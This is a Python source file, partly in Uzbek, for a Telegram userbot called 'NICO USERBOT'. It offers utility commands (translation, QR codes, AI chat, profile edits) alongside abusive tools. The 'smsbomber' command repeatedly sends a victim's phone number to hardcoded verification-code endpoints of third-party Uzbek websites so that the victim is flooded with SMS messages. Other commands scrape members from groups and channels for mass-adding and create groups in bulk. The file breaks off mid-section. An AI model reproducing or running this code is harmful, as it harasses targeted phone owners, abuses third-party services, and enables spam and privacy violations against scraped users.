# ═══════════════════════════════════════════════════════════════
#  ① SOZLAMALAR
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = "TELEGRAM BOT TOKENI"
ADMIN_ID  = OʻZINGIZNI TELEGRAM ID
API_ID    = API ID
API_HASH  = "API HASH"

# ═══════════════════════════════════════════════════════════════
#  ② IMPORT
# ═══════════════════════════════════════════════════════════════
import asyncio, json, os, time, io, logging, sys, re, copy, random
import datetime
import requests

import qrcode
import aiohttp

from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telethon.tl.functions.channels import (
    CreateChannelRequest, GetParticipantsRequest, InviteToChannelRequest
)
from telethon.tl.types import (
    MessageMediaPhoto, MessageMediaDocument,
    ChannelParticipantsSearch, ChatBannedRights
)
from telethon.tl.functions.channels import EditBannedRequest
from telethon.errors import (
    FloodWaitError, UserPrivacyRestrictedError,
    UserChannelsTooMuchError, PeerFloodError,
    SessionPasswordNeededError
)

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove,
    LabeledPrice
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, PreCheckoutQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.WARNING
)

try:
    import g4f
    G4F = True
except ImportError:
    G4F = False

# ═══════════════════════════════════════════════════════════════
#  ③ DATABASE
# ═══════════════════════════════════════════════════════════════
DB_FILE = "database.json"

_DEFAULTS = {
    "users": {},
    "sessions": {},
    "product": {
        "name":        "",
        "code_text":   "",
        "stars_on":    False,
        "stars_price": 0,
        "card_on":     False,
        "card_price":  0,
        "card_name":   "",
        "card_number": "",
        "card_holder": ""
    }
}

def db_load():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, encoding="utf-8") as f:
            data = json.load(f)
        for k, v in _DEFAULTS.items():
            data.setdefault(k, v)
        for k2, v2 in _DEFAULTS["product"].items():
            data["product"].setdefault(k2, v2)
        return data
    return copy.deepcopy(_DEFAULTS)

def db_save():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(DB, f, ensure_ascii=False, indent=2)

DB = db_load()

def prod():     return DB["product"]
def users():    return DB["users"]
def sessions(): return DB["sessions"]

# ═══════════════════════════════════════════════════════════════
#  ④ GLOBAL
# ═══════════════════════════════════════════════════════════════
STATES: dict[int, dict] = {}
UB:     dict[int, TelegramClient] = {}
UB_CFG: dict[int, dict] = {}

# SMS bomber APIs (xotiradan)
sms_db = {
    "apis": [
        "https://oqtepalavash.uz/api/sms/Send",
        "https://api.uybor.uz/api/v1/auth/code",
        "https://dafna.uz/api/send-code"
    ]
}

# Yig'ilgan odamlar
collected_users = []

def get_ub_cfg(uid: int) -> dict:
    if uid not in UB_CFG:
        UB_CFG[uid] = {
            "ai_active": False,
            "prompt": "Sen aqlli va foydali assistantsan. O'zbek tilida qisqa javob ber.",
            "waiting_prompt": False,
            "last_ai_call": 0
        }
    return UB_CFG[uid]

def is_admin(uid: int) -> bool:
    return uid == ADMIN_ID

def parse_tg_code(text: str):
    t = text.strip()
    m = re.fullmatch(r"(\d)\.(\d)\.(\d)\.(\d)\.(\d)", t)
    if m:
        return "".join(m.groups())
    if re.fullmatch(r"\d{5}", t):
        return t
    return None

def format_phone(phone):
    clean = "".join(filter(str.isdigit, phone))
    if len(clean) >= 9:
        return "998" + clean[-9:]
    return None

# ═══════════════════════════════════════════════════════════════
#  ⑤ AI YORDAMCHI
# ═══════════════════════════════════════════════════════════════
async def get_ai_response(text: str, system_prompt: str = "") -> str:
    if not G4F:
        return "⚠️ g4f o'rnatilmagan!"
    try:
        msgs = []
        if system_prompt:
            msgs.append({"role": "system", "content": system_prompt})
        msgs.append({"role": "user", "content": text})
        resp = await g4f.ChatCompletion.create_async(
            model=g4f.models.default,
            messages=msgs,
            ignored_providers=["Bing", "GoogleChat", "OpenaiChat", "HuggingChat"]
        )
        return resp if resp else "⚠️ AI hozircha javob bermadi."
    except Exception:
        return "⚠️ Tizim band, birozdan so'ng yozing."

# ═══════════════════════════════════════════════════════════════
#  ⑥ USERBOT ULANISH
# ═══════════════════════════════════════════════════════════════
async def ub_start(uid: int, session_str: str):
    try:
        cl = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await cl.connect()
        if not await cl.is_user_authorized():
            return False, "Avtorizatsiya yo'q"
        UB[uid] = cl
        _register_ub_handlers(cl)
        return True, "ok"
    except Exception as e:
        return False, str(e)

async def ub_stop(uid: int):
    cl = UB.pop(uid, None)
    if cl:
        try:
            await cl.disconnect()
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  ⑦ USERBOT HANDLERLAR — BARCHA BUYRUQLAR
# ═══════════════════════════════════════════════════════════════
def _register_ub_handlers(cl: TelegramClient):

    # ── .help ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.help'))
    async def help_cmd(event):
        await event.edit(
            "🔱 **NICO USERBOT: FULL ACCESS** 🔱\n\n"
            "⭐ **ASOSIY FUNKSIYALAR**⭐\n"
            "• `.help` - Buyuruqlar ro'yxati\n"
            "• `.ping` - Professional userbot tezligi\n"
            "• `.info` - Foydalanuvchi haqida ma'lumot olish reply\n"
            "• `.save` - Ma'lumotni saqlaydi reply\n"
            "• `.id` - Chat id va o'zizni id ni olish\n"
            "• `.status` - Admin statusi\n"
            "• `.calc` - Kalkulyator [ + . - . * . / ]\n"
            "• `.mute` - Budilnik\n"
            "👤 **PROFIL SOZLAMALARI FUNKSIYALARI** 👤\n"
            "• `.pfp` - Profil rasmini o'zgartirish reply\n"
            "• `.name [ nom ]` - Profil nomini o'zgartirish\n"
            "• `.bio [ bio nomi ]` - Profil bio nomini o'zgartirish\n"
            "• `.block` - Foydalanuvchini bloklash reply\n"
            "• `.unblock` - Foydalanuvchini blokdan ochish reply\n"
            "• `.check [ username nomi ]` - Username band yoki bo'sh ekanini bilish\n"
            "🤖 **AVTOMATIK FUNKSIYALAR AI** 🤖\n"
            "• `.NICO USERBOT AI on/off` - Barcha lichkalarga AI javob beradi\n"
            "• `.NICO USERBOT AI hazil` - NICO ai hazil so'z aytadi\n"
            "• `.cods [ matn ]` - AI kod yozib beradi\n"
            "• `.ai [matn]` - O'zingiz uchun AI javobi\n"
            "• `.NICO_prompt` - AI aqlliligini sozlash\n"
            "• `.guruh_ochish [ soni ]` - Avto guruh ochish\n"
            "• `.chiz [matn]` - O'zbek tilida rasm yaratib beradi\n"
            "• `.sd [ sekund ]` - O'zini o'zi o'chiradigan matn\n"
            "• `.qr` - QR kod yaratish\n"
            "🏧 **TARJIMA QILISH** 🏧\n"
            "• `.tr uz/eng/rus/ger/fra` - Tarjima qilish\n"
            "• `.translyatsiya uz/eng/rus/ger/fra` - Reply habarlarni tarjima qilish\n"
            "💣 **SMSBOMBER ULTRA** 💣\n"
            "• `.smsbomber 1 +998941234567` - Smsbomber qilish\n"
            "• `.sms apilar` - Smsbomber apilar ro'yxati\n"
            "• `.smsbomber api qo'sh https://api.url` - Smsbomber api qo'shish\n"
            "• `.smsbomber api o'chir 1` - Smsbomber api o'chirish\n"
            "👤 **GURUH / KANALLARDAN ODAM YIG'IB QO'SHISH** 👤\n"
            "• `.guruhlardan odam yig'ish [ tartib raqami ]`\n"
            "• `.kanallardan odam yig'ish [ tartib raqami ]`\n"
            "• `.guruhimga odam qo'shish [ tartib raqami ] [ nechta ]`\n"
            "• `.kanalimga odam qo'shish [ tartib raqami ] [ nechta ]`\n"
            "• `.guruhlarim ro'yxati` - Guruhlarim ro'yxati\n"
            "• `.kanallarim ro'yxati` - Kanallarim ro'yxati\n"
            "• `.yig'ilgan odamlar` - Yig'ilgan odamlar ro'yxati\n"
            "👥 **KONTAKTLARDAN ODAM QO'SHISH** 👥\n"
            "• `.kontaktlar ro'yxati` - Kontaktlar ro'yxati\n"
            "• `.chatlar` - Guruhlar va Kanallar ro'yxati\n"
            "• `.odam qo'shish [ tartib raqam ] [ soni ]` - Odam qo'shish\n"
            "🎭 **ANIMATSIYALAR** 🎭\n"
            "• `.func` - Animatsiyalar ro'yxati"
        )

    # ── .ping ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.ping'))
    async def ping_cmd(event):
        start = time.time()
        await event.edit("🚀 **Bog'lanish tekshirilmoqda...**")
        end = time.time()
        ms = round((end - start) * 1000, 2)
        status = "Yaxshi ✅" if ms < 300 else "Sekin ⚠️"
        await event.edit(f"🛰 **NICO USERBOT Tezligi:**\n\n⚡️ **Ping:** `{ms} ms`\n📊 **Holat:** {status}")

    # ── .id ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.id'))
    async def get_id(event):
        if event.is_reply:
            reply_msg = await event.get_reply_message()
            await event.edit(f"👤 **User ID:** `{reply_msg.sender_id}`\n👥 **Chat ID:** `{event.chat_id}`")
        else:
            await event.edit(f"👥 **Chat ID:** `{event.chat_id}`\n👤 **Sizning ID:** `{event.sender_id}`")

    # ── .info ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.info'))
    async def user_info(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Foydalanuvchini tahlil qilish uchun uning xabariga reply qiling!**")
        reply_msg = await event.get_reply_message()
        user = await cl.get_entity(reply_msg.sender_id)
        await event.edit("🔍 **NICO USERBOT: Foydalanuvchi tahlil qilinmoqda...**")
        await asyncio.sleep(0.8)
        await event.edit(
            f"👤 **FOYDALANUVCHI TAHLILI**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"📛 **Ism:** {user.first_name}\n"
            f"username: @{user.username if user.username else 'Mavjud emas'}\n"
            f"🤖 **Botmi:** {'Ha' if user.bot else 'Yoq'}\n"
            f"🚫 **O'chirilganmi:** {'Ha' if user.deleted else 'Yoq'}\n"
            f"━━━━━━━━━━━━━━\n"
            f"💡 **AI Xulosasi:** Bu foydalanuvchi tizimda faol."
        )

    # ── .save ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.save'))
    async def universal_saver(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Saqlash uchun biror xabarga (rasm, video yoki matn) javob (reply) bering!**")
        reply_msg = await event.get_reply_message()
        await event.edit("🔄 **NICO Userbot: Ma'lumot xotiraga ko'chirilmoqda...**")
        try:
            await reply_msg.forward_to('me')
            now = datetime.datetime.now().strftime('%H:%M:%S')
            await asyncio.sleep(0.5)
            await event.edit(f"✅ **Muvaffaqiyatli saqlandi!**\n⏰ **Vaqt:** `{now}`")
            await asyncio.sleep(2)
            await event.delete()
        except Exception as e:
            await event.edit(f"❌ **Saqlashda xatolik:** `{str(e)}`")

    # ── .calc ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.calc (.+)'))
    async def calculate(event):
        expression = event.pattern_match.group(1)
        try:
            result = eval(expression, {"__builtins__": None}, {})
            await event.edit(f"🔢 **Misol:** `{expression}`\n✅ **Natija:** `{result}`")
        except Exception:
            await event.edit("❌ **Xatolik!** Misolni to'g'ri yozing.")

    # ── .sd ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.sd (\d+) (.+)'))
    async def self_destruct_msg(event):
        seconds = int(event.pattern_match.group(1))
        text = event.pattern_match.group(2)
        await event.edit(text)
        await asyncio.sleep(seconds)
        await event.delete()

    # ── .rev ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.rev (.+)'))
    async def reverse_text(event):
        text = event.pattern_match.group(1)
        await event.edit(f"🔄 **Teskari matn:**\n`{text[::-1]}`")

    # ── .check ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.check (.+)'))
    async def check_username(event):
        username = event.pattern_match.group(1).replace("@", "")
        await event.edit(f"🔍 **@{username}** tekshirilmoqda...")
        try:
            await cl(functions.contacts.ResolveUsernameRequest(username=username))
            await event.edit(f"❌ **@{username}** band!")
        except Exception:
            await event.edit(f"✅ **@{username}** hozirda bo'sh!")

    # ── .block ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.block'))
    async def block_user(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Bloklash uchun foydalanuvchiga reply qiling!**")
        reply_msg = await event.get_reply_message()
        await cl(functions.contacts.BlockRequest(id=reply_msg.sender_id))
        await event.edit("🚫 **Foydalanuvchi bloklandi.**")

    # ── .unblock ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.unblock'))
    async def unblock_user(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Blokdan ochish uchun foydalanuvchiga reply qiling!**")
        reply_msg = await event.get_reply_message()
        await cl(functions.contacts.UnblockRequest(id=reply_msg.sender_id))
        await event.edit("✅ **Foydalanuvchi blokdan chiqarildi.**")

    # ── .pfp ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.pfp'))
    async def set_pfp(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Profilga qo'yish uchun rasmga reply qiling!**")
        reply_msg = await event.get_reply_message()
        if not reply_msg.photo:
            return await event.edit("⚠️ **Bu rasm emas!**")
        await event.edit("📸 **Profil rasmi yangilanmoqda...**")
        photo = await reply_msg.download_media()
        await cl(functions.photos.UploadProfilePhotoRequest(
            file=await cl.upload_file(photo)
        ))
        await event.edit("✅ **Profil rasmi muvaffaqiyatli o'zgartirildi!**")
        if os.path.exists(photo):
            os.remove(photo)

    # ── .name ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.name (.+)'))
    async def change_name(event):
        new_name = event.pattern_match.group(1)
        await cl(functions.account.UpdateProfileRequest(first_name=new_name))
        await event.edit(f"✅ **Ism o'zgartirildi:** `{new_name}`")

    # ── .bio ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.bio (.+)'))
    async def change_bio(event):
        new_bio = event.pattern_match.group(1)
        await cl(functions.account.UpdateProfileRequest(about=new_bio))
        await event.edit(f"✅ **Bio o'zgartirildi:** `{new_bio}`")

    # ── .status ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.status'))
    async def admin_status(event):
        me = await cl.get_me()
        cfg = get_ub_cfg(me.id)
        ai_status = "YOQILGAN ✅" if cfg["ai_active"] else "O'CHIRILDI ❌"
        await event.edit(
            f"👤 **ADMIN STATUS**\n\n"
            f"👑 **Admin:** {me.first_name}\n"
            f"🆔 **ID:** `{me.id}`\n"
            f"🤖 **Admin AI:** {ai_status}\n"
            f"📝 **Prompt:** `{cfg['prompt'][:30]}...`\n"
            f"⏳ **Vaqt:** {datetime.datetime.now().strftime('%H:%M:%S')}\n\n"
            f"🚀 *NICO Userbot barqaror ishlamoqda!*"
        )

    # ── .qr ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.qr(?: |$)(.*)'))
    async def qr_generator_pro(event):
        input_str = event.pattern_match.group(1).strip()
        qr_data   = None
        media_type = "Matn"
        await event.edit("🔍 **Ma'lumot tahlil qilinmoqda...**")
        if event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg.media:
                if isinstance(reply_msg.media, MessageMediaPhoto):
                    media_type = "Rasm"
                else:
                    media_type = "Video/Fayl"
                if event.is_group or event.is_channel:
                    chat_id = str(event.chat_id).replace("-100", "")
                    qr_data = f"https://t.me/c/{chat_id}/{reply_msg.id}"
                else:
                    qr_data = f"tg://openmessage?user_id={event.sender_id}&message_id={reply_msg.id}"
            elif reply_msg.text:
                qr_data    = reply_msg.text
                media_type = "Matn (Reply)"
        if not qr_data and input_str:
            qr_data    = input_str
            media_type = "Matn"
        if not qr_data:
            return await event.edit("❌ **Xatolik:** QR yasash uchun ma'lumot topilmadi!")
        try:
            await event.edit(f"🌀 **{media_type} uchun QR yaratilmoqda...**")
            qr = qrcode.QRCode(version=1,
                               error_correction=qrcode.constants.ERROR_CORRECT_H,
                               box_size=10, border=4)
            qr.add_data(qr_data)
            qr.make(fit=True)
            img      = qr.make_image(fill_color="black", back_color="white")
            temp_file = "titan_result_qr.png"
            img.save(temp_file)
            caption = (
                f"✅ **QR Tayyor!**\n\n"
                f"📂 **Turi:** `{media_type}`\n"
                f"📝 **Ma'lumot:** `{qr_data[:100]}`"
            )
            await cl.send_file(event.chat_id, temp_file, caption=caption,
                               reply_to=event.reply_to_msg_id if event.is_reply else None)
            if os.path.exists(temp_file):
                os.remove(temp_file)
            await event.delete()
        except Exception as e:
            await event.edit(f"⚠️ **QR yaratishda xatolik:**\n`{str(e)}`")

    # ── .cods ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.cods (.+)'))
    async def ai_coder(event):
        prompt = event.pattern_match.group(1)
        await event.edit("🤖 **NICO USERBOT AI o'ylamoqda...**")
        try:
            response = await asyncio.to_thread(
                g4f.ChatCompletion.create,
                model=g4f.models.gpt_4,
                messages=[{"role": "user",
                           "content": f"Faqat kod yozib ber, tushuntirish kerak emas. So'rov: {prompt}"}]
            ) if G4F else ""
            if response:
                final_text = f"💻 **NICO USERBOT AI tomonidan yozilgan kod:**\n\n<code>{response}</code>"
                if len(final_text) > 4096:
                    with open("code.txt", "w") as f:
                        f.write(response)
                    await cl.send_file(event.chat_id, "code.txt",
                                       caption="📄 Kod uzun bo'lgani uchun fayl ko'rinishida yuborildi.")
                    await event.delete()
                else:
                    await event.edit(final_text, parse_mode='html')
            else:
                await event.edit("❌ **Xatolik:** AI javob qaytarmadi.")
        except Exception as e:
            await event.edit(f"⚠️ **Xatolik yuz berdi:**\n<code>{str(e)}</code>", parse_mode='html')

    # ── .ai ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.ai (.+)'))
    async def manual_ai(event):
        query = event.pattern_match.group(1)
        await event.edit("🤔 **O'ylamoqda...**")
        me  = await cl.get_me()
        cfg = get_ub_cfg(me.id)
        response = await get_ai_response(query, cfg["prompt"])
        await event.edit(f"🤖 **AI:**\n\n{response}")

    # ── .adminai ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.NICO USERBOT AI (on|off|hazil)'))
    async def toggle_ai(event):
        me   = await cl.get_me()
        cfg  = get_ub_cfg(me.id)
        mode = event.pattern_match.group(1)
        if mode == "hazil":
            await event.edit("🤡 **NICO USERBOT hazil qilmoqchi...**")
            await asyncio.sleep(1.2)
            await event.edit("🔄 **Eng kulgili latifa tayyorlanmoqda...**")
            joke_prompt = "Menga o'zbek tilida bitta juda kulgili, yangi va qisqa latifa aytib ber. Iltimos, faqat latifaning o'zini yoz, ortiqcha gapirma."
            try:
                resp = await g4f.ChatCompletion.create_async(
                    model=g4f.models.default,
                    messages=[
                        {"role": "system", "content": "Sen professional qiziqchi va latifachisan."},
                        {"role": "user", "content": joke_prompt}
                    ],
                    ignored_providers=["Bing", "GoogleChat", "OpenaiChat"]
                ) if G4F else ""
                if resp and len(resp) > 5:
                    await event.edit(f"🤣 **NICO USERBOT AI Hazili:**\n\n{resp}")
                else:
                    await event.edit("🤣 **NICO USERBOT AI Hazili:**\n\nAfandining uyiga o'g'ri tushsa, sandiqqa kirib olibdi. O'g'ri ko'rib qolib: 'Nima qilyapsiz?' desa, Afandi: 'Hech narsa yo'qligidan uyalganimdan berkinib o'tiribman', dermish.")
            except Exception:
                await event.edit("🤣 **NICO USERBOT AI Hazili:**\n\n— Adajon, o'qituvchimiz odam maymundan tarqalgan dedilar.\n— O'g'lim, u o'qituvchingning qarindoshlariga tegishli gap, bizni aralashtirma!")
        else:
            cfg["ai_active"] = (mode == "on")
            status = "YOQILDI ✅" if cfg["ai_active"] else "O'CHIRILDI ❌"
            await event.edit(f"🤖 **NICO USERBOT AI tizimi {status}**")

    # ── .admin_prompt ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.NICO_prompt'))
    async def prompt_start(event):
        me  = await cl.get_me()
        cfg = get_ub_cfg(me.id)
        cfg["waiting_prompt"] = True
        await event.edit(f"📝 **Hozirgi Prompt:**\n`{cfg['prompt']}`\n\nYangi prompt yuboring.")

    # ── Prompt handler ──
    @cl.on(events.NewMessage(outgoing=True))
    async def prompt_handler(event):
        if not event.text or event.text.startswith("."):
            return
        me  = await cl.get_me()
        cfg = get_ub_cfg(me.id)
        if cfg.get("waiting_prompt"):
            cfg["prompt"]         = event.text
            cfg["waiting_prompt"] = False
            await event.respond("✅ **Yangi prompt saqlandi!**")

    # ── .chiz ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.chiz (.+)'))
    async def draw_image_uz(event):
        uz_prompt = event.pattern_match.group(1)
        await event.edit(f"🎨 **Rasm chizishga tayyorlanmoqda...**\n`{uz_prompt[:50]}...`")
        await asyncio.sleep(0.5)
        translate_prompt = f"Ushbu rasm tavsifini ingliz tiliga rasm yaratish promptiga moslab aniq tarjima qilib ber. Faqat tarjimaning o'zini yoz: '{uz_prompt}'"
        try:
            eng_response = await get_ai_response(translate_prompt,
                "Sen professional rasm yaratish promptlari tarjimoni san.")
            if "xato" in eng_response.lower() or len(eng_response) < 5:
                return await event.edit("❌ **AI orqali promptni tarjima qilishda xatolik yuz berdi.**")
            await event.edit(f"🎨 **Rasm chizilmoqda...**\n(Prompt: `{eng_response[:50]}...`)")
            api_url = f"https://image.pollinations.ai/prompt/{eng_response.replace(' ', '%20')}"
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    if response.status == 200:
                        image_data = await response.read()
                        image_file = io.BytesIO(image_data)
                        image_file.name = "NICO_ai_image.png"
                        await event.delete()
                        await cl.send_file(
                            event.chat_id, image_file,
                            caption=f"🎨 **AI tomonidan chizilgan rasm:**\n(O'zbekcha prompt: `{uz_prompt}`)",
                            reply_to=event.reply_to_msg_id
                        )
                    else:
                        await event.edit("❌ **Rasm yaratishda API xatosi yuz berdi.**")
        except Exception as e:
            await event.edit(f"❌ **Kutilmagan xatolik:**\n`{str(e)}`")

    # ── .tr ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.tr (eng|rus|uz|ger|fra) (.+)'))
    async def translate_ai(event):
        target_lang = event.pattern_match.group(1)
        text_to_translate = event.pattern_match.group(2)
        lang_dict = {
            "eng": "Ingliz tili", "rus": "Rus tili",
            "uz": "O'zbek tili", "ger": "Nemis tili", "fra": "Fransuz tili"
        }
        selected_lang = lang_dict.get(target_lang, "O'zbek tili")
        await event.edit(f"🔄 **{selected_lang}ga tarjima qilinmoqda...**")
        translate_prompt = f"Quyidagi matnni {selected_lang}ga juda aniq va xatosiz tarjima qilib ber. Faqat tarjimaning o'zini yoz: '{text_to_translate}'"
        response = await get_ai_response(translate_prompt, "Sen professional tarjimonsan.")
        await event.edit(f"🌐 **Tarjima ({target_lang}):**\n\n{response}")

    # ── .translyatsiya ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.translyatsiya (uz|rus|eng|ger|fra)'))
    async def reply_translator(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Xatoni tarjima qilish uchun biror xabarga javob (reply) bering!**")
        target_lang = event.pattern_match.group(1)
        lang_map = {
            "uz": "O'zbek tili", "rus": "Rus tili", "eng": "Ingliz tili",
            "ger": "Nemis tili", "fra": "Fransuz tili"
        }
        selected_lang = lang_map.get(target_lang)
        reply_msg = await event.get_reply_message()
        text_to_translate = reply_msg.text
        if not text_to_translate:
            return await event.edit("⚠️ **Xabarda matn topilmadi!**")
        await event.edit(f"🔄 **{selected_lang}ga o'girilmoqda...**")
        prompt = f"Ushbu matnni {selected_lang}ga juda aniq tarjima qilib ber. Faqat tarjimaning o'zini yoz: '{text_to_translate}'"
        response = await get_ai_response(prompt, "Sen professional tarjimonsan.")
        await event.edit(f"🌐 **Tarjima ({target_lang}):**\n\n{response}")

    # ── SMS BOMBER ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.smsbomber (\d+) (.+)'))
    async def sms_bomber(event):
        count     = int(event.pattern_match.group(1))
        raw_phone = event.pattern_match.group(2)
        phone     = format_phone(raw_phone)
        if not phone:
            return await event.edit("❌ **Xato raqam!**")
        if not sms_db["apis"]:
            return await event.edit("❌ **APIlar mavjud emas!** Avval API qo'shing.")
        success = 0
        failed  = 0
        await event.edit(
            f"🚀 **NICO Userbot SMS Attack**\n"
            f"📞 **Tel:** +{phone}\n"
            f"🔄 **Holat:** Tayyorlanmoqda...\n"
            f"✅ **Bajarildi:** 0 / {count}\n"
            f"❌ **Bajarilmadi:** 0"
        )
        for i in range(count):
            api_url = sms_db["apis"][i % len(sms_db["apis"])]
            try:
                res = requests.post(api_url, json={"phone": phone}, timeout=5)
                if res.status_code < 400:
                    success += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
            await event.edit(
                f"🚀 **NICO Userbot SMS Attack**\n"
                f"📞 **Tel:** +{phone}\n"
                f"🔄 **Holat:** Yuborilmoqda...\n"
                f"✅ **Bajarildi:** {success} / {count}\n"
                f"❌ **Bajarilmadi:** {failed}"
            )
            if i < count - 1:
                await asyncio.sleep(8)
        await event.edit(
            f"🏁 **Muvofiqiyatli tugatildi!**\n"
            f"📞 **Tel:** +{phone}\n"
            f"✅ **Jami yuborildi:** {success}\n"
            f"❌ **Xatolar:** {failed}"
        )

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.sms apilar'))
    async def list_apis(event):
        if not sms_db["apis"]:
            return await event.edit("📋 **Smsbomber apilar ro'yxati bo'sh!**")
        text = "📋 **Smsbomber apilar ro'yxati:**\n\n"
        for i, api in enumerate(sms_db["apis"], 1):
            text += f"{i}. `{api}`\n"
        await event.edit(text)

    @cl.on(events.NewMessage(outgoing=True, pattern=r"\.smsbomber api qo'sh (.+)"))
    async def add_api(event):
        new_api = event.pattern_match.group(1)
        sms_db["apis"].append(new_api)
        await event.edit(f"✅ **API qo'shildi!**\nJami: {len(sms_db['apis'])} ta.")

    @cl.on(events.NewMessage(outgoing=True, pattern=r"\.smsbomber api o'chir (\d+)"))
    async def remove_api(event):
        index = int(event.pattern_match.group(1)) - 1
        if 0 <= index < len(sms_db["apis"]):
            sms_db["apis"].pop(index)
            await event.edit(f"✅ **{index + 1} raqamli api o'chirildi!**")
        else:
            await event.edit("❌ **Api topilmadi!**")

    # ── GURUH OCHISH ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.guruh_ochish (\d+)'))
    async def auto_group_creator(event):
        count = int(event.pattern_match.group(1))
        now   = datetime.datetime.now()
        year  = now.strftime("%Y")
        full_date = now.strftime("%d.%m.%Y | %H:%M")
        await event.edit(f"🚀 **NICO Userbot: {count} ta guruh ochish jarayoni boshlandi...**")
        await asyncio.sleep(1)
        for i in range(1, count + 1):
            try:
                group_title = f"NICO USERBOT Group {year} - №{i}"
                group_desc  = f"Avtomatik ochilgan guruh. Sana: {full_date}"
                await event.edit(f"⏳ **{i}-guruh tayyorlanmoqda...**\n`Nomi: {group_title}`")
                result    = await cl(CreateChannelRequest(title=group_title, about=group_desc, megagroup=True))
                new_group = result.chats[0]
                info_msg  = (
                    f"📊 **YANGI GURUH MA'LUMOTI**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📅 **Yil:** `{year}-yil`\n"
                    f"🕒 **Vaqt:** `{full_date}`\n"
                    f"🔢 **Guruh tartibi:** `{i}/{count}`\n"
                    f"🛠 **Status:** Muvaffaqiyatli ochildi ✅\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
                await cl.send_message(new_group.id, info_msg)
                await event.edit(f"✅ **{i}-guruh ochildi!**\nID: `{new_group.id}`\n\n🕒 Keyingisi 5 soniyadan so'ng...")
                if i < count:
                    await asyncio.sleep(5)
            except Exception as e:
                await event.edit(f"❌ **Xatolik yuz berdi:** `{str(e)}`")
                break
        await asyncio.sleep(1)
        await event.edit(f"🏁 **Barcha {count} ta guruh muvaffaqiyatli ochib bo'lindi!**\n✅ Jarayon yakunlandi.")

    # ── GURUH/KANAL RO'YXATI ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.(guruhlarim|kanallarim) ro.yxati'))
    async def list_chats_ub(event):
        is_channel = 'kanallarim' in event.text
        chats = []
        async for dialog in cl.iter_dialogs():
            if is_channel and dialog.is_channel and not dialog.is_group:
                chats.append(dialog)
            elif not is_channel and dialog.is_group:
                chats.append(dialog)
        msg = "**Guruhlarim:**\n" if not is_channel else "**Kanallarim:**\n"
        for i, chat in enumerate(chats, 1):
            msg += f"{i}. **{chat.name}**\n"
        await event.edit(msg or "❌ Topilmadi.")

    # ── ODAM YIG'ISH ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.(guruhlardan|kanallardan) odam yig.ish(?: (\d+))?'))
    async def scrape_users(event):
        args       = event.pattern_match.group(2)
        is_channel = 'kanallardan' in event.text
        chats = []
        async for dialog in cl.iter_dialogs():
            if is_channel and dialog.is_channel and not dialog.is_group:
                chats.append(dialog)
            elif not is_channel and dialog.is_group:
                chats.append(dialog)
        if not args:
            msg = "**Qaysi joydan odam yig'amiz? Tartib raqamini yozing:**\n"
            for i, chat in enumerate(chats, 1):
                msg += f"{i}. {chat.name}\n"
            return await event.edit(msg)
        idx = int(args) - 1
        if 0 <= idx < len(chats):
            target_chat = chats[idx]
            await event.edit(f"🔍 `{target_chat.name}` dan haqiqiy odamlar saralanmoqda...")
            added_count = 0
            async for user in cl.iter_participants(target_chat):
                if not user.bot and not user.deleted:
                    if user.id not in [u['id'] for u in collected_users]:
                        full_name = (user.first_name or "") + " " + (user.last_name or "")
                        collected_users.append({'id': user.id, 'name': full_name.strip()})
                        added_count += 1
                        if added_count % 10 == 0:
                            await event.edit(f"✅ {added_count} ta odam to'plandi...")
            await event.edit(f"🏁 Tamom! `{target_chat.name}` dan {added_count} ta haqiqiy odam yig'ildi.")
        else:
            await event.edit("❌ Bunday raqamli chat yo'q.")

    # ── YIG'ILGAN ODAMLAR ──
